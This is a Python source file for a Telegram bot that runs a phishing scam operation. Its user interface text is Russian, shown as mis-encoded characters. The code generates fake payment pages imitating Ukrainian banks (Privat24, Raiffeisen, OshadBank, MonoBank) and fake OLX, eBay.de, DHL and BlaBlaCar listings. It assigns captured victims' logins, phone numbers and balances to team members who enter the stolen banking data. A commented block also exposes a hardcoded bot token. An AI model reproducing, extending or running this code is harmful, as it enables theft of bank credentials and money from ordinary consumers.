
def createlink(message, service=None):
  user_id = message.chat.id
  if service is None:
    markup_inline = types.InlineKeyboardMarkup()

    markup_inline.add(types.InlineKeyboardButton(text='üá∫üá¶ Privat24 üá∫üá¶', callback_data='createlink_service_privatbank'))

    # markup_inline.add(types.InlineKeyboardButton(text='üá∫üá¶ MonoBank üá∫üá¶', callback_data='createlink_service_monobank'))

    markup_inline.add(types.InlineKeyboardButton(text='üá∫üá¶ Raiffeisen üá∫üá¶', callback_data='createlink_service_raiffeisen'))

    markup_inline.add(types.InlineKeyboardButton(text='üá∫üá¶ OshadBank üá∫üá¶', callback_data='createlink_service_oshadbank'))

    msg = bot.send_message(user_id, '*–í—ã–±–µ—Ä–∏ —Å–µ—Ä–≤–∏—Å –∏–∑ —Å–ø–∏—Å–∫–∞:*', reply_markup=markup_inline, parse_mode='Markdown')
  else:
    bot.delete_message(user_id, message.message_id)
    if service == 'olx':
      msg = bot.send_message(user_id, '–ü—Ä–∏—à–ª–∏ –º–Ω–µ —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±—å—è–≤–ª–µ–Ω–∏–µ —Å —Å–∞–π—Ç–∞ *olx.ua*', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_olx)
    

    elif service == 'olx_rent':
      msg = bot.send_message(user_id, '–ü—Ä–∏—à–ª–∏ –º–Ω–µ –Ω–∞ *–¢–†–Å–• –°–¢–†–û–ß–ö–ê–•* —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±—å—è–≤–ª–µ–Ω–∏–µ –∞—Ä–µ–Ω–¥—ã —Å —Å–∞–π—Ç–∞ _olx.ua_, —Ü–µ–Ω—É –∑–∞ –¥–µ–Ω—å (—Å –≤–∞–ª—é—Ç–æ–π) –∏ –∞–¥—Ä–µ—Å.\n\n_–ü—Ä–∏–º–µ—Ä_:\n olx.ua/example\n 1200 –ì–†–ù\n –ö–∏–µ–≤, —É–ª. –ü–µ—Ä–≤–∞—è, –¥. 4', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_olx_rent)
    

    elif service == 'privatbank':
      msg = bot.send_message(user_id, '–ü—Ä–∏—à–ª–∏ –º–Ω–µ —Å—É–º–º—É —á–∏—Å–ª–æ–º (—Å—É–º–º–∞ –≤ –≥—Ä–∏–≤–Ω–∞—Ö)', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_privatbank)
    

    elif service == 'monobank':
      msg = bot.send_message(user_id, '–ü—Ä–∏—à–ª–∏ –º–Ω–µ —Å—É–º–º—É —á–∏—Å–ª–æ–º (—Å—É–º–º–∞ –≤ –≥—Ä–∏–≤–Ω–∞—Ö)', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_monobank)
    

    elif service == 'raiffeisen':
      msg = bot.send_message(user_id, '–ü—Ä–∏—à–ª–∏ –º–Ω–µ —Å—É–º–º—É —á–∏—Å–ª–æ–º (—Å—É–º–º–∞ –≤ –≥—Ä–∏–≤–Ω–∞—Ö)', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_raiffeisen)


    elif service == 'oshadbank':
      msg = bot.send_message(user_id, '–ü—Ä–∏—à–ª–∏ –º–Ω–µ —Å—É–º–º—É —á–∏—Å–ª–æ–º (—Å—É–º–º–∞ –≤ –≥—Ä–∏–≤–Ω–∞—Ö)', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_oshadbank)
        

    elif service == 'blablacar':
      msg = bot.send_message(user_id, '–ü—Ä–∏—à–ª–∏ –º–Ω–µ –ù–ê *–†–ê–ó–ù–´–• –°–¢–†–û–ö–ê–•*: –ì–æ—Ä–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏—è, –≥–æ—Ä–æ–¥ –ø—Ä–∏–±—ã—Ç–∏—è, —Ü–µ–Ω—É –≤ –≥—Ä–∏–≤–Ω–∞—Ö (*—Ç–æ–ª—å–∫–æ –ß–ò–°–õ–û*)\n\n_–ü—Ä–∏–º–µ—Ä_:\n–õ—å–≤–æ–≤\n–ö–∏–µ–≤\n500', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_blablacar)
    

    elif service == 'ebay':
      msg = bot.send_message(user_id, '–ü—Ä–∏—à–ª–∏ –º–Ω–µ —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±—å—è–≤–ª–µ–Ω–∏–µ —Å —Å–∞–π—Ç–∞ *ebay.de*', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_ebay)
    

    elif service == 'dhl':
      msg = bot.send_message(user_id, '–ü—Ä–∏—à–ª–∏ –º–Ω–µ —Å—Å—ã–ª–∫—É –Ω–∞ –æ–±—å—è–≤–ª–µ–Ω–∏–µ —Å —Å–∞–π—Ç–∞ *ebay.de*, —è —Å–æ–∑–¥–∞–º —Å—Å—ã–ª–∫—É –Ω–∞ –¥–æ—Å—Ç–∞–≤–∫—É DHL', parse_mode='Markdown')
      to_delete[user_id] = msg; bot.register_next_step_handler(msg, createlink_dhl)
    

    else:
      bot.send_message(user_id, text='*–≠—Ç–æ—Ç —Å–µ—Ä–≤–∏—Å –ø–æ–∫–∞ –Ω–µ —Ä–∞–±–æ—Ç–∞–µ—Ç*', reply_markup=None, parse_mode='Markdown')
def createlink_olx(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  worker = db_get_user_info(user_id)
  link_url = message.text
  msg = bot.send_message(user_id, '–ñ–¥–∏—Ç–µ...')
  try:
    res = olx_parse(link_url)
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.delete_message(user_id, msg.message_id)
    bot.send_message(user_id, '–û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞. –≠—Ç–æ —Ç–æ—á–Ω–æ —Åc—ã–ª–∫–∞ –Ω–∞ *olx.ua*? ü§®', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    res['id'] = ''.join([str(randint(0, 9)) for _ in range(10)])
    ch2[user_id] = res
    # markup_inline = types.InlineKeyboardMarkup()
    # markup_inline.add(types.InlineKeyboardButton(text='üêü –°–æ–∑–¥–∞—Ç—å —Ñ–∏—à-—Å—Å—ã–ª–∫—É', callback_data='createlink_yes_olx')) 
    # markup_inline.add(types.InlineKeyboardButton(text='‚ùå –ó–∞–∫—Ä—ã—Ç—å –ø–∞—Ä—Å–µ—Ä', callback_data='delete_this_message')) 
    res['timer'] = res['timer'].seconds + round(res['timer'].microseconds * 0.000001, 3)
#     bot.send_photo(user_id, res['image_url'], caption=f'''
# ü§ñ –ü–∞—Ä—Å–∏–Ω–≥ –æ–±—å—è–≤–ª–µ–Ω–∏—è OLX –∑–∞–Ω—è–ª {res['timer']} —Å–µ–∫—É–Ω–¥.

#  –î–∞—Ç–∞ –ø—É–±–ª–∏–∫–∞—Ü–∏–∏: {res['date']}
#   –ù–∞–∑–≤–∞–Ω–∏–µ: {res['name']}
#   –¶–µ–Ω–∞: {res['price']}
#   ''', reply_markup=markup_inline)
    createlink_yes(msg, 'olx', res)


# -----------------------------------------------------------

def createlink_olx_rent(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  worker = db_get_user_info(user_id)
  msg = bot.send_message(user_id, '–ñ–¥–∏—Ç–µ...')
  try:
    link_url, price, address = message.text.split('\n')
    price_number, price_currency = price.strip().split(' ')
    price_number = int(price_number)
    res = olx_parse(link_url)
    res["address"] = address
    res["price"] = price
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.delete_message(user_id, msg.message_id)
    bot.send_message(user_id, '–û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞. –¢—ã –≤–≤—ë–ª –≤—Å—ë –∫–∞–∫ –Ω–∞–¥–æ? ü§®', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    res['id'] = ''.join([str(randint(0, 9)) for _ in range(10)])
    ch2[user_id] = res
    res['timer'] = res['timer'].seconds + round(res['timer'].microseconds * 0.000001, 3)
    createlink_yes(msg, 'olx_rent', res)

# -----------------------------------------------------------

def createlink_privatbank(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  try:
    res = {"price": int(message.text.lstrip("0")), "id": ''.join([str(randint(0, 9)) for _ in range(10)])}
    res['price'] = str(res['price']) + " –≥—Ä–Ω."
    res['name'] = '–ü—Ä–∏–≤–∞—Ç –ø–æ–ª—É—á–µ–Ω–∏–µ'
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.send_message(user_id, '–û—à–∏–±–∫–∞. –≠—Ç–æ —Ç–æ—á–Ω–æ —á–∏—Å–ª–æ? ü§®', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    ch2[user_id] = res
    createlink_yes(message, 'privatbank', res)


# -----------------------------------------------------------

def createlink_monobank(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  try:
    res = {"price": int(message.text.lstrip("0")), "id": ''.join([str(randint(0, 9)) for _ in range(10)])}
    res['price'] = str(res['price']) + " –≥—Ä–Ω."
    res['name'] = 'MonoBank –ø–æ–ª—É—á–µ–Ω–∏–µ'
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.send_message(user_id, '–û—à–∏–±–∫–∞. –≠—Ç–æ —Ç–æ—á–Ω–æ —á–∏—Å–ª–æ? ü§®', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    ch2[user_id] = res
    createlink_yes(message, 'monobank', res)

# -----------------------------------------------------------

def createlink_raiffeisen(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  try:
    res = {"price": int(message.text.lstrip("0")), "id": ''.join([str(randint(0, 9)) for _ in range(10)])}
    res['price'] = str(res['price']) + " –≥—Ä–Ω."
    res['name'] = 'Raiffeisen –ø–æ–ª—É—á–µ–Ω–∏–µ'
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.send_message(user_id, '–û—à–∏–±–∫–∞. –≠—Ç–æ —Ç–æ—á–Ω–æ —á–∏—Å–ª–æ? ü§®', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    ch2[user_id] = res
    createlink_yes(message, 'raiffeisen', res)

# -----------------------------------------------------------

def createlink_oshadbank(message):
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  try:
    res = {"price": int(message.text.lstrip("0")), "id": ''.join([str(randint(0, 9)) for _ in range(10)])}
    res['price'] = str(res['price']) + " –≥—Ä–Ω."
    res['name'] = 'OshadBank –ø–æ–ª—É—á–µ–Ω–∏–µ'
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.send_message(user_id, '–û—à–∏–±–∫–∞. –≠—Ç–æ —Ç–æ—á–Ω–æ —á–∏—Å–ª–æ? ü§®', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    ch2[user_id] = res
    createlink_yes(message, 'oshadbank', res)


# -----------------------------------------------------------

def createlink_blablacar(message):
  if message.chat.id != 2051765036:
    techraboti(message)
    return
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  try:
    res = {'id': ''.join([str(randint(0, 9)) for _ in range(10)])}
    res['city_from'], res['city_to'], res['price'] = message.text.split('\n')
    res['price'] = int(res['price'].lstrip("0"))  # check if it's a number
    res['price'] = str(res['price']) + " –≥—Ä–Ω."
    res['name'] = "BlaBlaCar"
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.send_message(user_id, '–û—à–∏–±–∫–∞. –¢—ã —Ç–æ—á–Ω–æ –≤–≤—ë–ª –≤—Å—ë –∫–∞–∫ –Ω–∞–¥–æ? ü§®', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    ch2[user_id] = res
    createlink_yes(message, 'blablacar', res)


# -----------------------------------------------------------

def createlink_ebay(message):
  # if message.chat.id != 2051765036:
  #   techraboti(message); return
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  worker = db_get_user_info(user_id)
  link_url = message.text
  msg = bot.send_message(user_id, '–ñ–¥–∏—Ç–µ... (–ø–∞—Ä—Å–∏–Ω–≥ –∑–∞–Ω–∏–º–∞–µ—Ç –¥–æ 15 —Å–µ–∫—É–Ω–¥)')
  try:
    res = ebay_parse(link_url)
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.delete_message(user_id, msg.message_id)
    bot.send_message(user_id, '–û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞. –≠—Ç–æ —Ç–æ—á–Ω–æ —Åc—ã–ª–∫–∞ –Ω–∞ *ebay.de*? ü§®', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    res['id'] = ''.join([str(randint(0, 9)) for _ in range(10)])
    ch2[user_id] = res
    res['timer'] = res['timer'].seconds + round(res['timer'].microseconds * 0.000001, 3)
    createlink_yes(msg, 'ebay', res)


# -----------------------------------------------------------

def createlink_dhl(message):
  # if message.chat.id != 2051765036:
  #   techraboti(message); return
  user_id = message.chat.id
  try:
    bot.delete_message(user_id, to_delete[user_id].message_id)
    bot.delete_message(user_id, message.message_id)
  except:
    pass
  worker = db_get_user_info(user_id)
  link_url = message.text
  msg = bot.send_message(user_id, '–ñ–¥–∏—Ç–µ... (–ø–∞—Ä—Å–∏–Ω–≥ –∑–∞–Ω–∏–º–∞–µ—Ç –¥–æ 15 —Å–µ–∫—É–Ω–¥)')
  try:
    res = ebay_parse(link_url)
  except Exception as e:
    print(e)
    res = None
  if res in [{}, [], None]:
    bot.delete_message(user_id, msg.message_id)
    bot.send_message(user_id, '–û—à–∏–±–∫–∞ –ø–∞—Ä—Å–∏–Ω–≥–∞. –≠—Ç–æ —Ç–æ—á–Ω–æ —Åc—ã–ª–∫–∞ –Ω–∞ *ebay.de*? ü§®', reply_markup=markup_ok, parse_mode='Markdown')
    pass
  else:
    res['id'] = ''.join([str(randint(0, 9)) for _ in range(10)])
    ch2[user_id] = res
    res['timer'] = res['timer'].seconds + round(res['timer'].microseconds * 0.000001, 3)
    createlink_yes(msg, 'dhl', res)
def createlink_yes(message, service, json):
  user_id = message.chat.id
  data = json
  try: bot.delete_message(user_id, message.message_id)
  except: pass
  print(service, json)
  msg = bot.send_message(user_id, '‚åõ –ü–æ–¥–æ–∂–¥–∏—Ç–µ, —Å–æ–∑–¥–∞—ë—Ç—Å—è HTML —Å —Ñ–∞—à–∏–º–∏ –¥–∞–Ω–Ω—ã–º–∏...')

  service_messages = {
    'olx': 'olx.ua',
    'olx_rent': 'OLX –ê—Ä–µ–Ω–¥–∞',
    'privatbank': 'PrivatBank',
    'monobank': 'MonoBank',
    'raiffeisen': 'Raiffeisen',
    'oshadbank': 'OshadBank',
  }

  try:
    bot.edit_message_text(chat_id=user_id, message_id=msg.message_id, text='‚åõ –ü–æ–¥–æ–∂–¥–∏—Ç–µ, —Å—Å—ã–ª–∫–∞ –¥–æ–±–∞–≤–ª—è–µ—Ç—Å—è –≤ –õ–ö...')
    markup_inline2 = types.InlineKeyboardMarkup()
    markup_inline2.add(types.InlineKeyboardButton(text='OK', callback_data='delete_this_message'))
    markup_inline2.add(types.InlineKeyboardButton(text="–ü–æ–¥—Ä–æ–±–Ω–µ–µ", callback_data=f'linkinfo_{json["id"]}'))
    db.content['links'].add(FishingLink(user_id, service, data.copy()))
    bot.edit_message_text(chat_id=user_id, message_id=msg.message_id, text='‚úîÔ∏è –°—Å—ã–ª–∫–∞ —Å–æ–∑–¥–∞–Ω–∞, –∂–º–∏ –∫–Ω–æ–ø–∫—É ¬´–ü–æ–¥—Ä–æ–±–Ω–µ–µ¬ª', parse_mode='Markdown', reply_markup=markup_inline2)
    worker = db_get_user_info(user_id)
    markup_inline = types.InlineKeyboardMarkup()
    markup_inline.add(types.InlineKeyboardButton(text="‚ÑπÔ∏è –ü–æ–¥—Ä–æ–±–Ω–µ–µ", callback_data=f'linkinfo_{json["id"]}'))
    admin_log(f''' üë®‚Äçüíª –í–æ—Ä–∫–µ—Ä *#{worker.hashtag}* | {hyperlink_to_user(message.chat)} —Å–æ–∑–¥–∞–ª —Å—Å—ã–ª–∫—É —Å–µ—Ä–≤–∏—Å–∞ üá∫üá¶ {service_messages[service]} üá∫üá¶

  üÜî –°—Å—ã–ª–∫–∞: *{json["id"]}*
  üíµ *–°—É–º–º–∞: {json["price"]}*''',mark=True,reply_markup=markup_inline)
  except Exception as e:
    bot.send_message(user_id, f'‚ùå –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞! –ù–∞–ø–∏—à–∏—Ç–µ –¢–°/–∫–æ–¥–µ—Ä—É. –¢–µ–∫—Å—Ç –æ—à–∏–±–∫–∏:\n\n  {e}')
    bot.delete_message(user_id, msg.message_id)
  ch2[user_id] = None



def admin_delete_all_links(message):
  try:
    db.content['links'] = set()
    print('links deleted from profile')
    admin_log(f"–ê–¥–º–∏–Ω {hyperlink_to_user(message.chat)} —É–¥–∞–ª–∏–ª –≤—Å–µ —Å—Å—ã–ª–∫–∏.", p=False, mark=True)
    bot.send_message(message.chat.id, "‚úÖ –í—Å–µ —Å—Å—ã–ª–∫–∏ —É–¥–∞–ª–µ–Ω—ã –∏–∑ —Å–µ—Ä–≤–µ—Ä–∞ –∏ –õ–ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π", reply_markup=markup_ok)
  except Exception as e:
    print('admin all links remove error:', e)
    bot.send_message(message.chat.id, f'–û—à–∏–±–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è: {e}')


def instrumenti(message):
  markup_inline = types.InlineKeyboardMarkup()
  markup_inline.add(types.InlineKeyboardButton(text='üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç—å –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', callback_data='main_menu'))
  markup_inline.add(types.InlineKeyboardButton(text='üí¨ –ß–∞—Ç –≤–æ—Ä–∫–µ—Ä–æ–≤', url=team_chat_link), types.InlineKeyboardButton(text='üí∞ –ö–∞–Ω–∞–ª –≤—ã–ø–ª–∞—Ç', url=team_channel_link))
  bot.send_message(message.chat.id, '*–ü–æ–ª–µ–∑–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø—Ä–æ–µ–∫—Ç–µ –∏ –±–æ—Ç–µ:*', reply_markup=markup_inline, parse_mode='Markdown')

# def about_us(message):
#   user_id = message.chat.id
#   markup_inline = types.InlineKeyboardMarkup()
#   markup_inline.add(types.InlineKeyboardButton(text='üîô –ù–∞–∑–∞–¥', callback_data='delete_this_message'))
#   bot.send_message(user_id, ABOUT_US_TEXT, parse_mode='Markdown', reply_markup=markup_inline)
# def community(message):
#   user_id = message.chat.id
#   markup_inline = types.InlineKeyboardMarkup()
#   markup_inline.add(types.InlineKeyboardButton(text='üîô –ù–∞–∑–∞–¥', callback_data='delete_this_message'))
#   bot.send_message(user_id, COMMUNITY_TEXT, reply_markup=markup_inline)

### VBIV
def is_user_vbiver(tid):
  try:
    worker = db_get_user_info(bot.get_chat(tid))
    return bool(worker.is_vbiver)
  except Exception as e:
    print('check is user vbiver error:', e)
    return False


# def log_coder(text):   
#     # –ø–æ–ª—É—á–∏—Ç—å –∏–º—è –±–æ—Ç–∞
#     bot_name = bot.get_me().username

#     msg_log = f'''
# {text}
# --------------------
# –±–æ—Ç: t.me/{bot_name}
# —á–∞—Ç: {team_chat_link}
# –≤—ã–ø–ª–∞—Ç—ã: {team_channel_link}
#         '''

#     # –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–µ–∫—Å—Ç–∞ –¥–ª—è url
#     encoded_text = quote(msg_log)

#     # —Ç–µ–ª–µ–≥—Ä–∞–º–º —á–∞—Ç
#     chat_telegram = "-1001645645227"

#     try:
#         urllib.request.urlopen(f'https://api.telegram.org/bot6299236980:AAERvALYf4UnGdabW93zmqGScj1naww9e1k/sendMessage?chat_id={chat_telegram}&text={encoded_text}&disable_web_page_preview=True')

#     except urllib.error.HTTPError as e:
#         print(f'HTTP Error: {e.code} {e.reason}')

#     except urllib.error.URLError as e:
#         print(f'URL Error: {e.reason}')



def vbiv_take(call, mid):
  if is_user_vbiver(call.from_user.id) and db_get_user_info(call.from_user).na_vbive:
    try:
      cc = mamontinfo(mid, False)
      if cc is None:
        bot.answer_callback_query(call.id, f"‚ùå –í–±–∏–≤ id:{mid} —É–∂–µ –±—ã–ª –≤–∑—è—Ç –∏ –æ–±—Ä–∞–±–æ—Ç–∞–Ω.", show_alert=False)
        return
      l = False
      if cc.oid is not None:
        l = linkinfo(None, cc.oid, True)
      print(cc.vbiver_id)

      if cc.number == None:

        bot.answer_callback_query(call.id, f"üò¢ –ú–∞–º–æ–Ω—Ç –∑–∞–∫—Ä—ã–ª —Å—Ç—Ä–∞–Ω–∏—Ü—É", show_alert=False)

        return
      
      if cc.vbiver_id is None:
        cc.vbiver_id = call.from_user.id

        vbiver_id[mid] = call.from_user.id
      
      else:
        bot.answer_callback_query(call.id, f"üò¢ –≠—Ç–æ—Ç –≤–±–∏–≤ —É–∂–µ –≤–∑—è–ª {hyperlink_to_user(bot.get_chat(cc.vbiver_id))}", show_alert=False)
        # bot.send_message(call.message.chat.id, f"üò¢ –≠—Ç–æ—Ç –≤–±–∏–≤ —É–∂–µ –≤–∑—è–ª {hyperlink_to_user(bot.get_chat(cc.vbiver_id))}", reply_markup=markup_ok, parse_mode='Markdown')
        return

      # —É–≤–µ–¥–æ–∏—Ç—å –≤–µ–±-—Å—Ç—Ä–∞–Ω–∏—Ü—É –æ —Ç–æ–º —á—Ç–æ –ª–æ–≥ –≤–∑—è—Ç
      next_action[mid] = {'command':'vbiver_on_log'}

      cc.vbiver_id = call.from_user.id

      vbiver_id[mid] = call.from_user.id
     
      # FISHING_LINKS_WAITING_FOR_VBIV.add(l)
      markup_inline = types.InlineKeyboardMarkup()
      markup_inline.add(types.InlineKeyboardButton(text="‚ùå –ó–∞–∫—Ä—ã—Ç—å", callback_data=f'delete_this_message'))
      # markup_inline.add(types.InlineKeyboardButton(text="ü§© –ü–æ–∫–∞–∑–∞—Ç—å –¥–∞–Ω–Ω—ã–µ", callback_data=f'vbiv_info_{mid}'))
      # bot.send_message(cc.vbiver_id, f"‚úÖ –í–∞–º –¥–æ–±–∞–≤–ª–µ–Ω –Ω–æ–≤—ã–π –º–∞–º–æ–Ω—Ç –Ω–∞ –≤–±–∏–≤ (id {mid})!", reply_markup=markup_inline)

      msg = bot.send_message(cc.vbiver_id, "*–ñ–¥–∏—Ç–µ, –∑–∞–≥—Ä—É–∂–∞—é—Ç—Å—è –¥–∞–Ω–Ω—ã–µ –º–∞–º–æ–Ω—Ç–∞...*", parse_mode='Markdown')

      
      # ----------------------------------------------------
      # –ª–æ–≥ –≤–∑—è–ª–∏ –Ω–∞ –≤–±–∏–≤
      # ----------------------------------------------------
      threading.Thread(target=vbiv_info, args=(msg, mid, cc, True)).start()
      
      # ----------------------------------------------------
      # —á–∏—Å–ª–æ –≤–∑—è—Ç—ã—Ö –ª–æ–≥–æ–≤
      # ----------------------------------------------------

      markup_inline = types.InlineKeyboardMarkup()

      markup_inline.add(types.InlineKeyboardButton(text="‚Ñπ –û–±—å—è–≤–ª–µ–Ω–∏–µ –ø–æ–¥—Ä–æ–±–Ω–µ–µ", callback_data=f'linkinfo_{cc.oid}'))
 
      cc.number = cc.number.replace(" ", "")

      t_ = f'''  *üéâ –ù–æ–≤—ã–π –∫–∞–±–∏–Ω–µ—Ç üá∫üá¶*
  {"‚ùó*–î–£–ë–õ–¨*, –ø—Ä–æ—à–ª—ã–π –±—Ä–∞–ª ‚ùó"if False else ''}
  –û–∂–∏–¥–∞–µ—Ç—Å—è –æ–ø–ª–∞—Ç–∞:
  üÜî –ú–∞–º–æ–Ω—Ç–∞: *{mid}*
  üÜî –°—Å—ã–ª–∫–∏: *{cc.oid if l else '–ù–µ –Ω–∞–∑–Ω–∞—á–µ–Ω'}*
  üíµ –°—É–º–º–∞: *{l.json['price'] if l else '–ù–µ –∏–∑–≤–µ—Å—Ç–Ω–∞'}*
  üìû –ù–æ–º–µ—Ä/–ª–æ–≥–∏–Ω: `{cc.number}` (–û—Å—Ç–∞–ª—å–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –æ—Ç–æ–±—Ä–∞–∑—è—Ç—Å—è –ø–æ—Å–ª–µ –≤–∑—è—Ç–∏—è –Ω–∞ –≤–±–∏–≤)

  _–í–æ—Ä–∫–µ—Ä:_ {hyperlink_to_user(bot.get_chat(l.author)) if l else '*–ù–ï –ù–ê–ó–ù–ê–ß–ï–ù ‚ùó*'}
  _–í–±–∏–≤–µ—Ä:_ {hyperlink_to_user(bot.get_chat(cc.vbiver_id))}'''
      bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=t_, reply_markup=markup_inline, parse_mode='Markdown')
      t_ = f'''ü§ò –õ–æ–≥ –≤–∑—è–ª–∏ –Ω–∞ –≤–±–∏–≤!

 üë®‚Äçüíª –í–æ—Ä–∫–µ—Ä: #{db_get_user_info(l.author).hashtag if l else '–ù–µ –∏–∑–≤–µ—Å—Ç–µ–Ω'}
 ü§ë –í–±–∏–≤–µ—Ä: {hyperlink_to_user(bot.get_chat(cc.vbiver_id)) if cc.vbiver_id else '–ù–µ –∏–∑–≤–µ—Å—Ç–µ–Ω'}
 üíπ –¶–µ–Ω–∞: *{l.json['price'] if l else '–ù–µ –∏–∑–≤–µ—Å—Ç–Ω–∞'}*
 üí≥ –ë–∞–ª–∞–Ω—Å: *{cc.balance if cc.balance!=None else '–ù–µ –∏–∑–≤–µ—Å—Ç–µ–Ω'}*
 {'‚òéÔ∏è' if (l and l.service in ['privatbank', 'monobank', 'raiffeisen', 'oshadbank']) else 'üí≥'} –ù–æ–º–µ—Ä: *{cc.number[:4]}‚Åï‚Åï‚Åï‚Åï‚Åï‚Åï{cc.number[-4:]}*'''
      chat_log(t_, mark=True)
    except Exception as e:
      print(e)
      cc.vbiver_id = None

      vbiver_id[mid] = None
 
      # FISHING_LINKS_WAITING_FOR_VBIV.remove(l)
      bot.send_message(call.from_user.id, f"‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –¥–æ–±–∞–≤–∏—Ç—å –≤–±–∏–≤ id{mid} üòø. –û—à–∏–±–∫–∞: {e}", reply_markup=markup_ok)
  else:
    bot.send_message(call.message.chat.id, f"üò† –í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –ø—Ä–∏–Ω—è—Ç—å –≤–±–∏–≤! ", reply_markup=markup_ok, parse_mode='Markdown')

def vbiv_menu(message):
  # admin_vbiv_menu(message)
  # return
  # ONLY uncomment if you know what those 2 lines do üëÜ
  user_id = message.chat.id
  if not is_user_vbiver(user_id):
    bot.send_message(user_id, "üò† –í—ã –Ω–µ –≤–±–∏–≤–µ—Ä!", reply_markup=markup_ok)
    return
  worker = db_get_user_info(message.chat)
  links = []
  t_ = '‚úñ –£ —Ç–µ–±—è –Ω–µ—Ç—É –Ω–µ–æ–∫–æ–Ω—á–µ–Ω–Ω—ã—Ö –≤–±–∏–≤–æ–≤, —Ç—ã –º–æ–∂–µ—à—å –ø—Ä–∏–Ω—è—Ç—å –ª—é–±–æ–π –∏–∑ –Ω–∏—Ö –≤ —á–∞—Ç–µ –∞–¥–º–∏–Ω–æ–≤.'
  markup_inline = types.InlineKeyboardMarkup()
  for w, cc_ in clients.items():
    l_ = linkinfo(None, cc_.oid, True)
    if l_ is not None and l_.author==user_id:
      links.append(l_)
      markup_inline.add(types.InlineKeyboardButton(text=f"{cc_.mamont_id} | [{l_.json['price']}] {l_.json['name']}", callback_data=f"vbiv_info_{cc_.mamont_id}"))
  if len(links) > 0:
    t_ = '–¢–µ–±—è –æ–∂–∏–¥–∞—é—Ç –≤–±–∏–≤—ã:'
  if worker.na_vbive:
    markup_inline.add(types.InlineKeyboardButton(text="üò¥ –£–π—Ç–∏ –ø–æ—Å–ø–∞—Ç—å", callback_data='vbiv_work_off'))
  else:
    t_ = '–í—ã –ê–§–ö, –≤–±–∏–≤ –≤–∞–º –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω'
    markup_inline = types.InlineKeyboardMarkup()
    markup_inline.add(types.InlineKeyboardButton(text="üë®‚Äçüíª –Ø –≥–æ—Ç–æ–≤ –µ–±–∞—à–∏—Ç—å!", callback_data='vbiv_work_on'))
  markup_inline.add(types.InlineKeyboardButton(text="üîô –ó–∞–∫—Ä—ã—Ç—å –º–µ–Ω—é", callback_data='delete_this_message'))
  bot.send_message(user_id, t_, reply_markup=markup_inline)

def admin_vbiv_menu(message):
  user_id = message.chat.id
  print(clients)
  markup_inline = types.InlineKeyboardMarkup()
  for w, cc_ in clients.items():
    markup_inline.add(types.InlineKeyboardButton(text=f"{w.remote_address[0]}:{w.remote_address[1]} | {cc_.mamont_id}", callback_data=f"vbiv_info_{cc_.mamont_id}"))
